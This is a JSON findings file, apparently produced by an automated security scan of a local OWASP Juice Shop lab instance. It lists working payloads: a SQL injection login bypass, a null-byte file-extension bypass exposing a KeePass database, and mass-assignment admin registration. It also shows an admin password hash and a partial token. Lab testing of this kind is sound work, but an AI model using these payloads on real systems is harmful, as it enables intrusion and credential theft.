@@ -1,0 +1,102 @@
+{
+  "ok": true,
+  "summary": "Surface discovery complete against OWASP Juice Shop at http://127.0.0.1:3010. Found multiple live surfaces including FTP directory listing, REST API endpoints with SQL injection, authentication bypass via SQLi, mass assignment vulnerability, null byte file read bypass, and excessive data exposure in APIs. Multiple bookable candidates identified with proof excerpts from tool output.",
+  "surfaces": [
+    "http://127.0.0.1:3010/",
+    "http://127.0.0.1:3010/ftp/",
+    "http://127.0.0.1:3010/rest/products/search",
+    "http://127.0.0.1:3010/rest/user/login",
+    "http://127.0.0.1:3010/api/Users",
+    "http://127.0.0.1:3010/api/Challenges",
+    "http://127.0.0.1:3010/api/Feedbacks",
+    "http://127.0.0.1:3010/api/Products",
+    "http://127.0.0.1:3010/api/BasketItems",
+    "http://127.0.0.1:3010/.well-known/security.txt",
+    "http://127.0.0.1:3010/robots.txt",
+    "http://127.0.0.1:3010/redirect"
+  ],
+  "candidates": [
+    {
+      "title": "SQL Injection in Login - Authentication Bypass",
+      "location": "POST http://127.0.0.1:3010/rest/user/login",
+      "proof_excerpt": "POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\", proving SQL injection login bypass as admin user.",
+      "poc_hint": "SQL injection in email field of login form. Payload: ' OR 1=1--"
+    },
+    {
+      "title": "SQL Injection in Product Search",
+      "location": "GET http://127.0.0.1:3010/rest/products/search?q=",
+      "proof_excerpt": "GET /rest/products/search?q=' OR 1=1-- returned 500 error with \"SQLITE_ERROR: incomplete input\", confirming SQLite backend and SQL injection vulnerability. Normal search with q=1 returns product data successfully.",
+      "poc_hint": "Search parameter 'q' is SQL injectable with SQLite backend"
+    },
+    {
+      "title": "Null Byte Injection - File Extension Bypass",
+      "location": "GET http://127.0.0.1:3010/ftp/{file}%2500.md",
+      "proof_excerpt": "GET /ftp/suspicious_errors.yml%2500.md returned 200 with full YAML content (723 bytes) bypassing the '.md and .pdf files only' restriction via double URL-encoded null byte injection.",
+      "poc_hint": "Append %2500.md to bypass file extension filter on /ftp/"
+    },
+    {
+      "title": "Mass Assignment - Admin Registration",
+      "location": "POST http://127.0.0.1:3010/api/Users",
+      "proof_excerpt": "POST with {\"email\":\"hacker@test.com\",\"password\":\"test123\",\"role\":\"admin\"} returned 201 with body containing \"role\":\"admin\", proving mass assignment allows registering as admin.",
+      "poc_hint": "Include \"role\":\"admin\" in POST body to /api/Users to create admin account"
+    },
+    {
+      "title": "Excessive Data Exposure - User API",
+      "location": "GET http://127.0.0.1:3010/api/Users",
+      "proof_excerpt": "GET /api/Users with admin JWT returned all users including password hashes (e.g. \"password\":\"0192023a7bbd73250516f069df18b500\"), email addresses, roles, and other PII for 24 users.",
+      "poc_hint": "Authenticate as admin via SQLi login bypass then access /api/Users"
+    },
+    {
+      "title": "Directory Listing - FTP Directory",
+      "location": "GET http://127.0.0.1:3010/ftp/",
+      "proof_excerpt": "GET /ftp/ returned directory listing HTML containing files: acquisitions.md, announcement_encrypted.md, coupons_2013.md.bak, eastere.gg, encrypt.pyc, incident-support.kdbx, legal.md, package-lock.json.bak, package.json.bak, suspicious_errors.yml plus quarantine/ subdirectory.",
+      "poc_hint": "robots.txt disallows /ftp which exposes sensitive files"
+    },
+    {
+      "title": "Sensitive File Exposure - KeePass Database",
+      "location": "GET http://127.0.0.1:3010/ftp/incident-support.kdbx%2500.md",
+      "proof_excerpt": "GET /ftp/incident-support.kdbx%2500.md returned 200 with 3246 bytes of binary KeePass database content (application/octet-stream), exposing sensitive password vault.",
+      "poc_hint": "KeePass database file containing incident support credentials"
+    },
+    {
+      "title": "Sensitive File Exposure - Package.json with Dependency Info",
+      "location": "GET http://127.0.0.1:3010/ftp/package.json.bak%2500.md",
+      "proof_excerpt": "GET /ftp/package.json.bak%2500.md returned 200 with full package.json showing express-jwt version 0.1.3 (known vulnerable), express 4.16, sqlite3, and other dependencies.",
+      "poc_hint": "Exposed package.json reveals vulnerable dependency versions"
+    },
+    {
+      "title": "Sensitive File Exposure - Security Rules YAML",
+      "location": "GET http://127.0.0.1:3010/ftp/suspicious_errors.yml%2500.md",
+      "proof_excerpt": "GET /ftp/suspicious_errors.yml%2500.md returned 200 with YAML content containing detection rules for blocked illegal activity, file upload errors, redirect issues, etc.",
+      "poc_hint": "Internal security monitoring rules exposed"
+    },
+    {
+      "title": "Challenge Data Exposure via API",
+      "location": "GET http://127.0.0.1:3010/api/Challenges",
+      "proof_excerpt": "GET /api/Challenges with admin JWT returned all challenge definitions including descriptions, difficulty levels, category tags, and 'solved' status booleans for all CTF challenges.",
+      "poc_hint": "Exposes internal challenge state enabling attackers to track progress"
+    }
+  ],
+  "facts": [
+    "Target is OWASP Juice Shop running Express ^4.22.1 on Node.js with SQLite database",
+    "Authentication uses JWT tokens verified by express-jwt 0.1.3",
+    "FTP directory listing enabled with file extension whitelist bypassed via null byte",
+    "User database contains 24+ users including admin, customer, deluxe, and accounting roles",
+    "Password stored as MD5 hash (0192023a7bbd73250516f069df18b500 for admin)",
+    "Admin JWT token obtained via SQLi: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...",
+    "Application exposes REST API at /rest/* and CRUD API at /api/*",
+    "File server at /ftp/* restricts to .md and .pdf extensions but bypassable",
+    "Registration does not sanitize 'role' field allowing mass assignment",
+    "Hiring page at /#/jobs and score-board at /#/score-board",
+    "Easter egg page at /the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg renders 3D scene"
+  ],
+  "deadends": [
+    "/api/Orders - Unexpected path error (500)",
+    "/api/ (root) - Unexpected path error (500)",
+    "/rest/ (root) - Unexpected path error (500)",
+    "/redirect - Open redirect blocked with 'Unrecognized target URL' (406)",
+    "/ftp/suspicious_errors.yml - Direct access blocked by extension filter (403)",
+    "/rest/products/1 - Unexpected path (500), no direct product endpoint",
+    "Feedback POST requires captchaId parameter which requires prior captcha fetch"
+  ]
+}
